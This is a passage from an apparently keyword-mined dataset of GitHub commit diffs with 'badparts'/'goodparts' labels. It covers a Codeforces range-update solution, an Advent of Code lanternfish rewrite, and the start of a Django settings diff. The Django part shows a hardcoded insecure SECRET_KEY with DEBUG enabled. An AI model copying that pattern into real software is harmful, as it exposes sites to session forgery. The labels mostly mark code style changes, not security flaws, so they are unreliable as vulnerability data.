sys.stdin.readline().rstrip(\"\\r\\n\")\r\n \r\n-def lmii():\r\n+def ilst():\r\n     return list(map(int,input().split()))\r\n-\r\n-def ii():\r\n-    return int(input())\r\n-\r\n-def si():\r\n-    return str(input())\r\n     \r\n-def lmsi():\r\n+def islst():\r\n     return list(map(str,input().split()))\r\n     \r\n-def mii():\r\n+def inum():\r\n     return map(int,input().split())\r\n-\r\n-def msi():\r\n-    return map(str,input().split())\r\n-\r\n-i2c = lambda n: chr(ord('a') + n)\r\n-c2i = lambda c: ord(c) - ord('a')\r\n-\r\n-\r\n-#####################################################\r\n-\r\n+    \r\n \r\n class SortedList():\r\n         BUCKET_RATIO = 50\r\n@@ -170,55 +133,31 @@ def index_right(self,x):\n                 ans += len(i)\r\n             return ans\r\n  \r\n- \r\n-\r\n-#########################################\r\n-    \r\n-    \r\n-if(os.path.exists(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\")):\r\n-    sys.stdin = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\", 'r')\r\n-    sys.stdout = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/output.txt\", 'w') \r\n-else:\r\n-    input = io.BytesIO(os.read(0, os.fstat(0).st_size)).readline\r\n-    \r\n-\r\n-for _ in range(ii()):\r\n-    n,q=mii()\r\n-    A=lmii()\r\n+t = int(input())\r\n+for _ in range(t):\r\n+    n,q = inum()\r\n+    l = ilst()\r\n \r\n+    d = {}\r\n+    h = SortedList([i for i in range(1,n+1)])\r\n \r\n-    h=SortedList([i+1 for i in range(n)])\r\n-\r\n-    dic=defaultdict(int)\r\n     for i in range(n):\r\n-        dic[i+1]=0\r\n-\r\n+        d[i+1] = 0\r\n \r\n-    for _ in range(q):\r\n-        mi=lmii()\r\n-        if len(mi)==3:\r\n-            val,left,right=mi\r\n-            ind = h.index(left)\r\n-\r\n-            while ind<len(h) and h[ind]>=left and h[ind]<=right:\r\n-                if dic[h[ind]]<=2:\r\n-                    dic[h[ind]]+=1\r\n-\r\n-                    snum=A[h[ind]-1]\r\n-                    \r\n-                    A[h[ind]-1]= sum(int(el) for el in str(snum))\r\n-\r\n-                    ind+=1\r\n+    for k in range(q):\r\n+        nl = ilst()\r\n+        if nl[0] == 2:\r\n+            print(l[nl[1]-1])\r\n+        else:\r\n+            ind = h.index(nl[1])\r\n+            while ind < len(h) and h[ind] >= nl[1] and h[ind] <= nl[2]:\r\n+                if d[h[ind]] <= 2:\r\n+                    d[h[ind]] += 1\r\n+\r\n+                    tmp = 0\r\n+                    for i in str(l[h[ind]-1]):\r\n+                        tmp += int(i)\r\n+                    l[h[ind]-1] = tmp\r\n+                    ind += 1\r\n                 else:\r\n                     h.remove(h[ind])\r\n-\r\n-        else:\r\n-            val,x=mi\r\n-            print(A[x-1])\r\n-\r\n-\r\n-\r\n-# def solve(t):\r\n-    \r\n-\r\n-    \n\\ No newline at end of file\ndiff --git a\/submissions.json b\/submissions.json\nindex 6fe9305..bf7bcc6 100644\n--- a\/submissions.json\n+++ b\/submissions.json\n@@ -3104,6 +3104,24 @@\n     ],\n     \"timestamp\": \"Feb\/01\/2023 12:43\"\n   },\n+  \"CF192103912\": {\n+    \"contest_id\": 1791,\n+    \"language\": \"PyPy 3-64\",\n+    \"path\": \"codeforces\/1791\/F.py\",\n+    \"platform\": \"Codeforces\",\n+    \"problem_index\": \"F\",\n+    \"problem_name\": \"Range Update Point Query\",\n+    \"problem_url\": \"https:\/\/codeforces.com\/contest\/1791\/problem\/F\",\n+    \"submission_id\": \"CF192103912\",\n+    \"submission_url\": \"https:\/\/codeforces.com\/contest\/1791\/submission\/192103912\",\n+    \"tags\": [\n+      \"binary search\",\n+      \"brute force\",\n+      \"data structures\",\n+      \"*1500\"\n+    ],\n+    \"timestamp\": \"Feb\/04\/2023 11:24\"\n+  },\n   \"CF192104825\": {\n     \"contest_id\": 1791,\n     \"language\": \"PyPy 3-64\",\n","files":{"\/codeforces\/1791\/F.py":{"changes":[{"diff":"\n-#bisect.bisect_left(a, x, lo=0, hi=len(a)) is the analog of std::lower_bound()\r\n-#bisect.bisect_right(a, x, lo=0, hi=len(a)) is the analog of std::upper_bound()\r\n-#from heapq import heappop,heappush,heapify #heappop(hq), heapify(list)\r\n-#from collections import deque as dq #deque  e.g. myqueue=dq(list)\r\n-#append\/appendleft\/appendright\/pop\/popleft\r\n-#from bisect import bisect as bis #a=[1,3,4,6,7,8] #bis(a,5)-->3\r\n-#import bisect #bisect.bisect_left(a,4)-->2 #bisect.bisect(a,4)-->3\r\n-#import statistics as stat  # stat.median(a), mode, mean\r\n-#from itertools import permutations(p,r)#combinations(p,r)\r\n-#combinations(p,r) gives r-length tuples #combinations_with_replacement\r\n-#every element can be repeated\r\n-        \r\n-import sys, threading, os, io \r\n+import sys\r\n import math\r\n-import time\r\n-from os import path\r\n-from collections import defaultdict, Counter, deque\r\n-from bisect import *\r\n-from string import ascii_lowercase\r\n-from functools import cmp_to_key\r\n-import heapq\r\n+import copy\r\n+import itertools\r\n import bisect\r\n-from io import BytesIO, IOBase\t\t\t\t\t\t\t\t\r\n-\r\n-\r\n-def lcm(a, b):\r\n-    return (a*b)\/\/(math.gcd(a,b))\r\n- \r\n+from heapq import heappop, heappush, heapify\r\n \r\n input = lambda: sys.stdin.readline().rstrip(\"\\r\\n\")\r\n \r\n-def lmii():\r\n+def ilst():\r\n     return list(map(int,input().split()))\r\n-\r\n-def ii():\r\n-    return int(input())\r\n-\r\n-def si():\r\n-    return str(input())\r\n     \r\n-def lmsi():\r\n+def islst():\r\n     return list(map(str,input().split()))\r\n     \r\n-def mii():\r\n+def inum():\r\n     return map(int,input().split())\r\n-\r\n-def msi():\r\n-    return map(str,input().split())\r\n-\r\n-i2c = lambda n: chr(ord('a') + n)\r\n-c2i = lambda c: ord(c) - ord('a')\r\n-\r\n-\r\n-#####################################################\r\n-\r\n+    \r\n \r\n class SortedList():\r\n         BUCKET_RATIO = 50\r\n","add":8,"remove":45,"filename":"\/codeforces\/1791\/F.py","badparts":["        \r","import sys, threading, os, io \r","import time\r","from os import path\r","from collections import defaultdict, Counter, deque\r","from bisect import *\r","from string import ascii_lowercase\r","from functools import cmp_to_key\r","import heapq\r","from io import BytesIO, IOBase\t\t\t\t\t\t\t\t\r","\r","\r","def lcm(a, b):\r","    return (a*b)\/\/(math.gcd(a,b))\r"," \r","def lmii():\r","\r","def ii():\r","    return int(input())\r","\r","def si():\r","    return str(input())\r","def lmsi():\r","def mii():\r","\r","def msi():\r","    return map(str,input().split())\r","\r","i2c = lambda n: chr(ord('a') + n)\r","c2i = lambda c: ord(c) - ord('a')\r","\r","\r","\r"],"goodparts":["import sys\r","import copy\r","import itertools\r","from heapq import heappop, heappush, heapify\r","def ilst():\r","def islst():\r","def inum():\r","    \r"]},{"diff":"\n                 ans += len(i)\r\n             return ans\r\n  \r\n- \r\n-\r\n-#########################################\r\n-    \r\n-    \r\n-if(os.path.exists(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\")):\r\n-    sys.stdin = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\", 'r')\r\n-    sys.stdout = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/output.txt\", 'w') \r\n-else:\r\n-    input = io.BytesIO(os.read(0, os.fstat(0).st_size)).readline\r\n-    \r\n-\r\n-for _ in range(ii()):\r\n-    n,q=mii()\r\n-    A=lmii()\r\n+t = int(input())\r\n+for _ in range(t):\r\n+    n,q = inum()\r\n+    l = ilst()\r\n \r\n+    d = {}\r\n+    h = SortedList([i for i in range(1,n+1)])\r\n \r\n-    h=SortedList([i+1 for i in range(n)])\r\n-\r\n-    dic=defaultdict(int)\r\n     for i in range(n):\r\n-        dic[i+1]=0\r\n-\r\n+        d[i+1] = 0\r\n \r\n-    for _ in range(q):\r\n-        mi=lmii()\r\n-        if len(mi)==3:\r\n-            val,left,right=mi\r\n-            ind = h.index(left)\r\n-\r\n-            while ind<len(h) and h[ind]>=left and h[ind]<=right:\r\n-                if dic[h[ind]]<=2:\r\n-                    dic[h[ind]]+=1\r\n-\r\n-                    snum=A[h[ind]-1]\r\n-                    \r\n-                    A[h[ind]-1]= sum(int(el) for el in str(snum))\r\n-\r\n-                    ind+=1\r\n+    for k in range(q):\r\n+        nl = ilst()\r\n+        if nl[0] == 2:\r\n+            print(l[nl[1]-1])\r\n+        else:\r\n+            ind = h.index(nl[1])\r\n+            while ind < len(h) and h[ind] >= nl[1] and h[ind] <= nl[2]:\r\n+                if d[h[ind]] <= 2:\r\n+                    d[h[ind]] += 1\r\n+\r\n+                    tmp = 0\r\n+                    for i in str(l[h[ind]-1]):\r\n+                        tmp += int(i)\r\n+                    l[h[ind]-1] = tmp\r\n+                    ind += 1\r\n                 else:\r\n                     h.remove(h[ind])\r\n-\r\n-        else:\r\n-            val,x=mi\r\n-            print(A[x-1])\r\n-\r\n-\r\n-\r\n-# def solve(t):\r\n-    \r\n-\r\n-    \n\\ No newline at end of file","add":22,"remove":46,"filename":"\/codeforces\/1791\/F.py","badparts":[" \r","\r","    \r","    \r","if(os.path.exists(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\")):\r","    sys.stdin = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\", 'r')\r","    sys.stdout = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/output.txt\", 'w') \r","else:\r","    input = io.BytesIO(os.read(0, os.fstat(0).st_size)).readline\r","    \r","\r","for _ in range(ii()):\r","    n,q=mii()\r","    A=lmii()\r","    h=SortedList([i+1 for i in range(n)])\r","\r","    dic=defaultdict(int)\r","        dic[i+1]=0\r","\r","    for _ in range(q):\r","        mi=lmii()\r","        if len(mi)==3:\r","            val,left,right=mi\r","            ind = h.index(left)\r","\r","            while ind<len(h) and h[ind]>=left and h[ind]<=right:\r","                if dic[h[ind]]<=2:\r","                    dic[h[ind]]+=1\r","\r","                    snum=A[h[ind]-1]\r","                    \r","                    A[h[ind]-1]= sum(int(el) for el in str(snum))\r","\r","                    ind+=1\r","\r","        else:\r","            val,x=mi\r","            print(A[x-1])\r","\r","\r","\r","    \r","\r"],"goodparts":["t = int(input())\r","for _ in range(t):\r","    n,q = inum()\r","    l = ilst()\r","    d = {}\r","    h = SortedList([i for i in range(1,n+1)])\r","        d[i+1] = 0\r","    for k in range(q):\r","        nl = ilst()\r","        if nl[0] == 2:\r","            print(l[nl[1]-1])\r","        else:\r","            ind = h.index(nl[1])\r","            while ind < len(h) and h[ind] >= nl[1] and h[ind] <= nl[2]:\r","                if d[h[ind]] <= 2:\r","                    d[h[ind]] += 1\r","\r","                    tmp = 0\r","                    for i in str(l[h[ind]-1]):\r","                        tmp += int(i)\r","                    l[h[ind]-1] = tmp\r","                    ind += 1\r"]}],"source":"\n \r import sys, threading, os, io \r import math\r import time\r from os import path\r from collections import defaultdict, Counter, deque\r from bisect import *\r from string import ascii_lowercase\r from functools import cmp_to_key\r import heapq\r import bisect\r from io import BytesIO, IOBase\t\t\t\t\t\t\t\t\r \r \r def lcm(a, b):\r return(a*b)\/\/(math.gcd(a,b))\r \r \r input=lambda: sys.stdin.readline().rstrip(\"\\r\\n\")\r \r def lmii():\r return list(map(int,input().split()))\r \r def ii():\r return int(input())\r \r def si():\r return str(input())\r \r def lmsi():\r return list(map(str,input().split()))\r \r def mii():\r return map(int,input().split())\r \r def msi():\r return map(str,input().split())\r \r i2c=lambda n: chr(ord('a') +n)\r c2i=lambda c: ord(c) -ord('a')\r \r \r \r \r class SortedList():\r BUCKET_RATIO=50\r REBUILD_RATIO=170\r \r def __init__(self,buckets):\r buckets=list(buckets)\r buckets=sorted(buckets)\r self._build(buckets)\r \r def __iter__(self):\r for i in self.buckets:\r for j in i: yield j\r \r def __reversed__(self):\r for i in reversed(self.buckets):\r for j in reversed(i): yield j\r \r def __len__(self):\r return self.size\r \r def __contains__(self,x):\r if self.size==0: return False\r bucket=self._find_bucket(x)\r i=bisect.bisect_left(bucket,x)\r return i !=len(bucket) and bucket[i]==x\r \r def __getitem__(self,x):\r if x < 0: x +=self.size\r if x < 0: raise IndexError\r for i in self.buckets:\r if x < len(i): return i[x]\r x -=len(i)\r raise IndexError\r \r def _build(self,buckets=None):\r if buckets is None: buckets=list(self)\r self.size=len(buckets)\r bucket_size=int(math.ceil(math.sqrt(self.size\/self.BUCKET_RATIO)))\r tmp=[]\r for i in range(bucket_size):\r t=buckets[(self.size*i)\/\/bucket_size:(self.size*(i+1))\/\/bucket_size]\r tmp.append(t)\r self.buckets=tmp\r \r def _find_bucket(self,x):\r for i in self.buckets:\r if x <=i[-1]:\r return i\r return i\r \r def add(self,x):\r if self.size==0:\r self.buckets=[[x]]\r self.size=1\r return True\r \r bucket=self._find_bucket(x)\r bisect.insort(bucket,x)\r self.size +=1\r if len(bucket) > len(self.buckets) * self.REBUILD_RATIO:\r self._build()\r return True\r \r def remove(self,x):\r if self.size==0: return False\r bucket=self._find_bucket(x)\r i=bisect.bisect_left(bucket,x)\r if i==len(bucket) or bucket[i] !=x: return False\r bucket.pop(i)\r self.size -=1\r if len(bucket)==0: self._build()\r return True\r \r def lt(self,x):\r for i in reversed(self.buckets):\r if i[0] < x:\r return i[bisect.bisect_left(i,x) -1]\r \r def le(self,x):\r for i in reversed(self.buckets):\r if i[0] <=x:\r return i[bisect.bisect_right(i,x) -1]\r \r def gt(self,x):\r for i in self.buckets:\r if i[-1] > x:\r return i[bisect.bisect_right(i,x)]\r \r def ge(self,x):\r for i in self.buckets:\r if i[-1] >=x:\r return i[bisect.bisect_left(i,x)]\r def index(self,x):\r ans=0\r for i in self.buckets:\r if i[-1] >=x:\r return ans +bisect.bisect_left(i,x)\r ans +=len(i)\r return ans\r \r def index_right(self,x):\r ans=0\r for i in self.buckets:\r if i[-1] > x:\r return ans +bisect.bisect_right(i,x)\r ans +=len(i)\r return ans\r \r \r \r \r \r if(os.path.exists(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\")):\r sys.stdin=open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\", 'r')\r sys.stdout=open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/output.txt\", 'w') \r else:\r input=io.BytesIO(os.read(0, os.fstat(0).st_size)).readline\r \r \r for _ in range(ii()):\r n,q=mii()\r A=lmii()\r \r \r h=SortedList([i+1 for i in range(n)])\r \r dic=defaultdict(int)\r for i in range(n):\r dic[i+1]=0\r \r \r for _ in range(q):\r mi=lmii()\r if len(mi)==3:\r val,left,right=mi\r ind=h.index(left)\r \r while ind<len(h) and h[ind]>=left and h[ind]<=right:\r if dic[h[ind]]<=2:\r dic[h[ind]]+=1\r \r snum=A[h[ind]-1]\r \r A[h[ind]-1]=sum(int(el) for el in str(snum))\r \r ind+=1\r else:\r h.remove(h[ind])\r \r else:\r val,x=mi\r print(A[x-1])\r \r \r \r \r \r ","sourceWithComments":"#bisect.bisect_left(a, x, lo=0, hi=len(a)) is the analog of std::lower_bound()\r\n#bisect.bisect_right(a, x, lo=0, hi=len(a)) is the analog of std::upper_bound()\r\n#from heapq import heappop,heappush,heapify #heappop(hq), heapify(list)\r\n#from collections import deque as dq #deque  e.g. myqueue=dq(list)\r\n#append\/appendleft\/appendright\/pop\/popleft\r\n#from bisect import bisect as bis #a=[1,3,4,6,7,8] #bis(a,5)-->3\r\n#import bisect #bisect.bisect_left(a,4)-->2 #bisect.bisect(a,4)-->3\r\n#import statistics as stat  # stat.median(a), mode, mean\r\n#from itertools import permutations(p,r)#combinations(p,r)\r\n#combinations(p,r) gives r-length tuples #combinations_with_replacement\r\n#every element can be repeated\r\n        \r\nimport sys, threading, os, io \r\nimport math\r\nimport time\r\nfrom os import path\r\nfrom collections import defaultdict, Counter, deque\r\nfrom bisect import *\r\nfrom string import ascii_lowercase\r\nfrom functools import cmp_to_key\r\nimport heapq\r\nimport bisect\r\nfrom io import BytesIO, IOBase\t\t\t\t\t\t\t\t\r\n\r\n\r\ndef lcm(a, b):\r\n    return (a*b)\/\/(math.gcd(a,b))\r\n \r\n\r\ninput = lambda: sys.stdin.readline().rstrip(\"\\r\\n\")\r\n\r\ndef lmii():\r\n    return list(map(int,input().split()))\r\n\r\ndef ii():\r\n    return int(input())\r\n\r\ndef si():\r\n    return str(input())\r\n    \r\ndef lmsi():\r\n    return list(map(str,input().split()))\r\n    \r\ndef mii():\r\n    return map(int,input().split())\r\n\r\ndef msi():\r\n    return map(str,input().split())\r\n\r\ni2c = lambda n: chr(ord('a') + n)\r\nc2i = lambda c: ord(c) - ord('a')\r\n\r\n\r\n#####################################################\r\n\r\n\r\nclass SortedList():\r\n        BUCKET_RATIO = 50\r\n        REBUILD_RATIO = 170\r\n    \r\n        def __init__(self,buckets):\r\n            buckets = list(buckets)\r\n            buckets = sorted(buckets)\r\n            self._build(buckets)\r\n    \r\n        def __iter__(self):\r\n            for i in self.buckets:\r\n                for j in i: yield j\r\n    \r\n        def __reversed__(self):\r\n            for i in reversed(self.buckets):\r\n                for j in reversed(i): yield j\r\n    \r\n        def __len__(self):\r\n            return self.size\r\n    \r\n        def __contains__(self,x):\r\n            if self.size == 0: return False\r\n            bucket = self._find_bucket(x)\r\n            i = bisect.bisect_left(bucket,x)\r\n            return i != len(bucket) and bucket[i] == x\r\n    \r\n        def __getitem__(self,x):\r\n            if x < 0: x += self.size\r\n            if x < 0: raise IndexError\r\n            for i in self.buckets:\r\n                if x < len(i): return i[x]\r\n                x -= len(i)\r\n            raise IndexError\r\n    \r\n        def _build(self,buckets=None):\r\n            if buckets is None: buckets = list(self)\r\n            self.size = len(buckets)\r\n            bucket_size = int(math.ceil(math.sqrt(self.size\/self.BUCKET_RATIO)))\r\n            tmp = []\r\n            for i in range(bucket_size):\r\n                t = buckets[(self.size*i)\/\/bucket_size:(self.size*(i+1))\/\/bucket_size]\r\n                tmp.append(t)\r\n            self.buckets = tmp\r\n    \r\n        def _find_bucket(self,x):\r\n            for i in self.buckets:\r\n                if x <= i[-1]:\r\n                    return i\r\n            return i\r\n    \r\n        def add(self,x):\r\n            # O(\u221aN)\r\n            if self.size == 0:\r\n                self.buckets = [[x]]\r\n                self.size = 1\r\n                return True\r\n    \r\n            bucket = self._find_bucket(x)\r\n            bisect.insort(bucket,x)\r\n            self.size += 1\r\n            if len(bucket) > len(self.buckets) * self.REBUILD_RATIO:\r\n                self._build()\r\n            return True\r\n    \r\n        def remove(self,x):\r\n            # O(\u221aN)\r\n            if self.size == 0: return False\r\n            bucket = self._find_bucket(x)\r\n            i = bisect.bisect_left(bucket,x)\r\n            if i == len(bucket) or bucket[i] != x: return False\r\n            bucket.pop(i)\r\n            self.size -= 1\r\n            if len(bucket) == 0: self._build()\r\n            return True\r\n    \r\n        def lt(self,x):\r\n            # less than < x\r\n            for i in reversed(self.buckets):\r\n                if i[0] < x:\r\n                    return i[bisect.bisect_left(i,x) - 1]\r\n    \r\n        def le(self,x):\r\n            # less than or equal to <= x\r\n            for i in reversed(self.buckets):\r\n                if i[0] <= x:\r\n                    return i[bisect.bisect_right(i,x) - 1]\r\n    \r\n        def gt(self,x):\r\n            # greater than > x\r\n            for i in self.buckets:\r\n                if i[-1] > x:\r\n                    return i[bisect.bisect_right(i,x)]\r\n    \r\n        def ge(self,x):\r\n            # greater than or equal to >= x\r\n            for i in self.buckets:\r\n                if i[-1] >= x:\r\n                    return i[bisect.bisect_left(i,x)]\r\n        def index(self,x):\r\n            # the number of elements < x\r\n            ans = 0\r\n            for i in self.buckets:\r\n                if i[-1] >= x:\r\n                    return ans + bisect.bisect_left(i,x)\r\n                ans += len(i)\r\n            return ans\r\n    \r\n        def index_right(self,x):\r\n            # the number of elements < x\r\n            ans = 0\r\n            for i in self.buckets:\r\n                if i[-1] > x:\r\n                    return ans + bisect.bisect_right(i,x)\r\n                ans += len(i)\r\n            return ans\r\n \r\n \r\n\r\n#########################################\r\n    \r\n    \r\nif(os.path.exists(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\")):\r\n    sys.stdin = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/input.txt\", 'r')\r\n    sys.stdout = open(\"\/Users\/nitishkumar\/Documents\/Template_Codes\/Python\/CP\/Codeforces\/output.txt\", 'w') \r\nelse:\r\n    input = io.BytesIO(os.read(0, os.fstat(0).st_size)).readline\r\n    \r\n\r\nfor _ in range(ii()):\r\n    n,q=mii()\r\n    A=lmii()\r\n\r\n\r\n    h=SortedList([i+1 for i in range(n)])\r\n\r\n    dic=defaultdict(int)\r\n    for i in range(n):\r\n        dic[i+1]=0\r\n\r\n\r\n    for _ in range(q):\r\n        mi=lmii()\r\n        if len(mi)==3:\r\n            val,left,right=mi\r\n            ind = h.index(left)\r\n\r\n            while ind<len(h) and h[ind]>=left and h[ind]<=right:\r\n                if dic[h[ind]]<=2:\r\n                    dic[h[ind]]+=1\r\n\r\n                    snum=A[h[ind]-1]\r\n                    \r\n                    A[h[ind]-1]= sum(int(el) for el in str(snum))\r\n\r\n                    ind+=1\r\n                else:\r\n                    h.remove(h[ind])\r\n\r\n        else:\r\n            val,x=mi\r\n            print(A[x-1])\r\n\r\n\r\n\r\n# def solve(t):\r\n    \r\n\r\n    "}},"msg":"Add solution for problem `F - Range Update Point Query`\nLink: https:\/\/codeforces.com\/contest\/1791\/problem\/F\nTags: binary search, brute force, data structures, *1500\nRef: https:\/\/codeforces.com\/contest\/1791\/submission\/192103912"}},"https:\/\/github.com\/Odatas\/Advent-of-Code":{"31c190def5e5dd7cbaa8648029af376f084eaab4":{"url":"https:\/\/api.github.com\/repos\/Odatas\/Advent-of-Code\/commits\/31c190def5e5dd7cbaa8648029af376f084eaab4","html_url":"https:\/\/github.com\/Odatas\/Advent-of-Code\/commit\/31c190def5e5dd7cbaa8648029af376f084eaab4","message":"Update day6.py\n\nReplaced Stupid Brute Force with smart brute force.","sha":"31c190def5e5dd7cbaa8648029af376f084eaab4","keyword":"brute force update","diff":"diff --git a\/Day 6\/day6.py b\/Day 6\/day6.py\nindex b40fab3..12ffd0c 100644\n--- a\/Day 6\/day6.py\t\n+++ b\/Day 6\/day6.py\t\n@@ -1,23 +1,39 @@\n # -*- coding: utf-8 -*-\n \"\"\"\n-Created on Mon Dec  6 06:44:39 2021\n+Created on Mon Dec  6 07:06:18 2021\n \n-@author: Spongetheone\n+@author: pphilipiak\n \"\"\"\n \n-lanternFish=[0]\n-with open(r'''day6.txt''') as f:\n-    lanternFishPopulation = [[int(x) for x in line.split(\",\")] for line in f][0]\n+# -*- coding: utf-8 -*-\n+\"\"\"\n+Created on Mon Dec  6 06:44:39 2021\n \n+@author: pphilipiak\n+\"\"\"\n+with open(r'''day6.txt''') as f:\n+    calenderInput = [[int(x) for x in line.split(\",\")] for line in f][0]\n \n days = 256\n+fishPopulation = []\n+\n+for i in range(9):\n+    fishPopulation.append(calenderInput.count(i))\n \n for i in range(days):\n-    print(\"Day:\", i,\"Number of Fish:\",len(lanternFishPopulation))\n-    for index in range(len(lanternFishPopulation)):\n-        lanternFishPopulation[index] -=1\n-        if lanternFishPopulation[index] < 0:\n-            lanternFishPopulation[index] = 6\n-            lanternFishPopulation.append(8)\n-\n-print(\"Part1:\",len(lanternFishPopulation))\n+    tempList = []\n+    for j in range(1,9):\n+        tempList.append(fishPopulation[j])\n+\n+    tempList.append(fishPopulation[0])\n+    tempList[6] +=fishPopulation[0]\n+    fishPopulation = tempList.copy()\n+\n+fishCounter = 0\n+for i in fishPopulation:\n+    fishCounter += i\n+\n+print(fishCounter)\n+\n+\n+\n","files":{"\/Day 6\/day6.py":{"changes":[{"diff":"\n # -*- coding: utf-8 -*-\n \"\"\"\n-Created on Mon Dec  6 06:44:39 2021\n+Created on Mon Dec  6 07:06:18 2021\n \n-@author: Spongetheone\n+@author: pphilipiak\n \"\"\"\n \n-lanternFish=[0]\n-with open(r'''day6.txt''') as f:\n-    lanternFishPopulation = [[int(x) for x in line.split(\",\")] for line in f][0]\n+# -*- coding: utf-8 -*-\n+\"\"\"\n+Created on Mon Dec  6 06:44:39 2021\n \n+@author: pphilipiak\n+\"\"\"\n+with open(r'''day6.txt''') as f:\n+    calenderInput = [[int(x) for x in line.split(\",\")] for line in f][0]\n \n days = 256\n+fishPopulation = []\n+\n+for i in range(9):\n+    fishPopulation.append(calenderInput.count(i))\n \n for i in range(days):\n-    print(\"Day:\", i,\"Number of Fish:\",len(lanternFishPopulation))\n-    for index in range(len(lanternFishPopulation)):\n-        lanternFishPopulation[index] -=1\n-        if lanternFishPopulation[index] < 0:\n-            lanternFishPopulation[index] = 6\n-            lanternFishPopulation.append(8)\n-\n-print(\"Part1:\",len(lanternFishPopulation))\n+    tempList = []\n+    for j in range(1,9):\n+        tempList.append(fishPopulation[j])\n+\n+    tempList.append(fishPopulation[0])\n+    tempList[6] +=fishPopulation[0]\n+    fishPopulation = tempList.copy()\n+\n+fishCounter = 0\n+for i in fishPopulation:\n+    fishCounter += i\n+\n+print(fishCounter)\n+\n+\n+\n","add":29,"remove":13,"filename":"\/Day 6\/day6.py","badparts":["Created on Mon Dec  6 06:44:39 2021","@author: Spongetheone","lanternFish=[0]","with open(r'''day6.txt''') as f:","    lanternFishPopulation = [[int(x) for x in line.split(\",\")] for line in f][0]","    print(\"Day:\", i,\"Number of Fish:\",len(lanternFishPopulation))","    for index in range(len(lanternFishPopulation)):","        lanternFishPopulation[index] -=1","        if lanternFishPopulation[index] < 0:","            lanternFishPopulation[index] = 6","            lanternFishPopulation.append(8)","print(\"Part1:\",len(lanternFishPopulation))"],"goodparts":["Created on Mon Dec  6 07:06:18 2021","@author: pphilipiak","\"\"\"","Created on Mon Dec  6 06:44:39 2021","@author: pphilipiak","\"\"\"","with open(r'''day6.txt''') as f:","    calenderInput = [[int(x) for x in line.split(\",\")] for line in f][0]","fishPopulation = []","for i in range(9):","    fishPopulation.append(calenderInput.count(i))","    tempList = []","    for j in range(1,9):","        tempList.append(fishPopulation[j])","    tempList.append(fishPopulation[0])","    tempList[6] +=fishPopulation[0]","    fishPopulation = tempList.copy()","fishCounter = 0","for i in fishPopulation:","    fishCounter += i","print(fishCounter)"]}],"source":"\n \"\"\" Created on Mon Dec 6 06:44:39 2021 @author: Spongetheone \"\"\" lanternFish=[0] with open(r'''day6.txt''') as f: lanternFishPopulation=[[int(x) for x in line.split(\",\")] for line in f][0] days=256 for i in range(days): print(\"Day:\", i,\"Number of Fish:\",len(lanternFishPopulation)) for index in range(len(lanternFishPopulation)): lanternFishPopulation[index] -=1 if lanternFishPopulation[index] < 0: lanternFishPopulation[index]=6 lanternFishPopulation.append(8) print(\"Part1:\",len(lanternFishPopulation)) ","sourceWithComments":"# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Mon Dec  6 06:44:39 2021\n\n@author: Spongetheone\n\"\"\"\n\nlanternFish=[0]\nwith open(r'''day6.txt''') as f:\n    lanternFishPopulation = [[int(x) for x in line.split(\",\")] for line in f][0]\n\n\ndays = 256\n\nfor i in range(days):\n    print(\"Day:\", i,\"Number of Fish:\",len(lanternFishPopulation))\n    for index in range(len(lanternFishPopulation)):\n        lanternFishPopulation[index] -=1\n        if lanternFishPopulation[index] < 0:\n            lanternFishPopulation[index] = 6\n            lanternFishPopulation.append(8)\n\nprint(\"Part1:\",len(lanternFishPopulation))\n"}},"msg":"Update day6.py\n\nReplaced Stupid Brute Force with smart brute force."}},"https:\/\/github.com\/trisngo\/django-ecommerce-webapp":{"f9d38caf7361635eb7c7b3e82de0d93dcbe17bec":{"url":"https:\/\/api.github.com\/repos\/trisngo\/django-ecommerce-webapp\/commits\/f9d38caf7361635eb7c7b3e82de0d93dcbe17bec","html_url":"https:\/\/github.com\/trisngo\/django-ecommerce-webapp\/commit\/f9d38caf7361635eb7c7b3e82de0d93dcbe17bec","message":"Update prevent login brute-force function","sha":"f9d38caf7361635eb7c7b3e82de0d93dcbe17bec","keyword":"brute force update","diff":"diff --git a\/DiChoHo\/DiChoHo\/settings.py b\/DiChoHo\/DiChoHo\/settings.py\nindex 818c6c6..17f7ccb 100644\n--- a\/DiChoHo\/DiChoHo\/settings.py\n+++ b\/DiChoHo\/DiChoHo\/settings.py\n@@ -1,151 +1,170 @@\n-\"\"\"\n-Django settings for DiChoHo project.\n-\n-Generated by 'django-admin startproject' using Django 3.2.7.\n-\n-For more information on this file, see\n-https:\/\/docs.djangoproject.com\/en\/3.2\/topics\/settings\/\n-\n-For the full list of settings and their values, see\n-https:\/\/docs.djangoproject.com\/en\/3.2\/ref\/settings\/\n-\"\"\"\n-\n-from pathlib import Path\n-import os\n-\n-# Build paths inside the project like this: BASE_DIR \/ 'subdir'.\n-BASE_DIR = Path(__file__).resolve().parent.parent\n-\n-\n-# Quick-start development settings - unsuitable for production\n-# See https:\/\/docs.djangoproject.com\/en\/3.2\/howto\/deployment\/checklist\/\n-\n-# SECURITY WARNING: keep the secret key used in production secret!\n-SECRET_KEY = 'django-insecure-=$3=r_!k(1_%nzxs_7^ip4ar(mn+^#a32m8rlo1)8v7ntkyznc'\n-\n-# SECURITY WARNING: don't run with debug turned on in production!\n-DEBUG = True\n-\n-ALLOWED_HOSTS = ['127.0.0.1', 'localhost', '192.168.1.20']\n-\n-\n-# Application definition\n-\n-INSTALLED_APPS = [\n-   